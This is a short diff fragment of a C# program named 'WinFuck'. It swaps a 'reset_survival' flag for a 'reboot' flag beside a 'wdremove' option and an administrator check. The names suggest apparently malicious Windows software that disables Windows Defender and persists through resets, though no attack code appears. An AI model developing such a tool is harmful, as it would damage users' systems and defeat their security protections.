@@ -8,7 +8,7 @@ using System.Security.Principal;
 class WinFuck
 {
     static bool wdremove = false; //doesn't work correctly, I'm lazy
-    static bool reset_survival = true;
+    static bool reboot = false;
 
     static void Main(string[] args) {
         if (!IsAdmin()) {
